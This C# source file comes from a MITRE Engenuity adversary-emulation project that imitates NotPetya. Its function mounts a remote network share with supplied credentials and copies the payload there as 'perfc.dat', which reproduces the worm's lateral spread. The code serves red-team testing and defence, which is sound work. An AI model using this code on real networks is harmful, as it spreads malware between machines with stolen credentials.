/*=============================================================================================
*
*    Description:  This program emulates NotPetya.
*   
*        Version:  1.0
*        Created:  September 1st, 2021
*
*      Author(s):  Jesse Burgoon
*   Organization:  MITRE Engenuity
*
*  References(s): https://attack.mitre.org/software/S0368/
*
*=============================================================================================
*/
using System;
using System.Runtime.InteropServices;

namespace SharpNP
{
    class CpAdminShare
    {
        public enum ResourceScope
        {
            RESOURCE_CONNECTED = 1,
            RESOURCE_GLOBALNET,
            RESOURCE_REMEMBERED,
            RESOURCE_RECENT,
            RESOURCE_CONTEXT
        }

        public enum ResourceType
        {
            RESOURCETYPE_ANY,
            RESOURCETYPE_DISK,
            RESOURCETYPE_PRINT,
            RESOURCETYPE_RESERVED
        }

        public enum ResourceUsage
        {
            RESOURCEUSAGE_CONNECTABLE = 0x00000001,
            RESOURCEUSAGE_CONTAINER = 0x00000002,
            RESOURCEUSAGE_NOLOCALDEVICE = 0x00000004,
            RESOURCEUSAGE_SIBLING = 0x00000008,
            RESOURCEUSAGE_ATTACHED = 0x00000010,
            RESOURCEUSAGE_ALL = (RESOURCEUSAGE_CONNECTABLE | RESOURCEUSAGE_CONTAINER | RESOURCEUSAGE_ATTACHED),
        }

        public enum ResourceDisplayType
        {
            RESOURCEDISPLAYTYPE_GENERIC,
            RESOURCEDISPLAYTYPE_DOMAIN,
            RESOURCEDISPLAYTYPE_SERVER,
            RESOURCEDISPLAYTYPE_SHARE,
            RESOURCEDISPLAYTYPE_FILE,
            RESOURCEDISPLAYTYPE_GROUP,
            RESOURCEDISPLAYTYPE_NETWORK,
            RESOURCEDISPLAYTYPE_ROOT,
            RESOURCEDISPLAYTYPE_SHAREADMIN,
            RESOURCEDISPLAYTYPE_DIRECTORY,
            RESOURCEDISPLAYTYPE_TREE,
            RESOURCEDISPLAYTYPE_NDSCONTAINER
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        private class NETRESOURCE
        {
            public ResourceScope dwScope = 0;
            public ResourceType dwType = 0;
            public ResourceDisplayType dwDisplayType = 0;
            public ResourceUsage dwUsage = 0;
            public string lpLocalName = null;
            public string lpRemoteName = null;
            public string lpComment = null;
            public string lpProvider = null;
        }

        [DllImport("mpr.dll", SetLastError = true, EntryPoint = "WNetAddConnection2W", CharSet = CharSet.Unicode)]
        private static extern int WNetAddConnection2W(NETRESOURCE lpNetResource, string lpPassword, string lpUsername, int dwFlags);

        [DllImport("mpr.dll", SetLastError = true, EntryPoint = "WNetCancelConnection2W", CharSet = CharSet.Unicode)]
        private static extern int WNetCancelConnection2W(string name, int flags, bool force);

        static public void CopyNpToShare(string filePath, string unc, string user, string password)
        {
            NETRESOURCE nr = new NETRESOURCE()
            {
                dwScope = ResourceScope.RESOURCE_GLOBALNET,
                dwType = ResourceType.RESOURCETYPE_DISK,
                dwDisplayType = ResourceDisplayType.RESOURCEDISPLAYTYPE_SHARE,
                dwUsage = ResourceUsage.RESOURCEUSAGE_CONNECTABLE,
                lpLocalName = null,
                lpRemoteName = unc,
                lpProvider = null
            };
            int res = WNetAddConnection2W(nr, password, user, 0);
            if (res == 0)
            {
                // Only copy file over if it doesn't already exist
                if (!System.IO.File.Exists(System.IO.Path.Combine(unc, "perfc.dat")))
                {
                    //Console.WriteLine("{0}\n{1}", filePath, System.IO.Path.Combine(unc, "perfc.dat"));
                    System.IO.File.Copy(filePath, System.IO.Path.Combine(unc, "perfc.dat"));
                }
                else
                {
                    // Cancel the share connection if the NP executable already exists
                    WNetCancelConnection2W(unc, 0, true);
                }
            }
            else
            {
                Console.WriteLine("Error: {0}", res);
            }

        }

    }
}
